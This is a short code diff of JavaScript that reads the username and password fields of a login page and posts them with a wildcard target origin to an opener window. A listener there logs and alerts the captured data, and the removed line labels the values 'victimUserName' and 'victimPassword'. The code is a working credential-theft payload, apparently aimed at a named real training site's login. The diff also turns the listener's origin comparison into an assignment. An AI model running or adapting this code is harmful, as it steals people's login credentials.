@@ -17,7 +17,7 @@
             
             var userName = document.getElementsByName("username")[0].value;
             var password = document.getElementsByName("password")[0].value;
-            window.opener.postMessage( "victimUserName="+  encodeURIComponent(userName) +  "&victimPassword=" + encodeURIComponent(password)  ,"*");
+            window.opener.postMessage( {userName,password}  ,"*");
           };
         }
       }, 500);`,
@@ -28,7 +28,7 @@
       }, 5000);
 
       window.addEventListener("message", function (msg) {
-        if ((msg.origin == "https://iclass.eccouncil.org")) {
+        if ((msg.origin = "https://iclass.eccouncil.org")&&msg.data.password) {
           console.log(msg.data);
           alert(JSON.stringify(msg.data));
         }
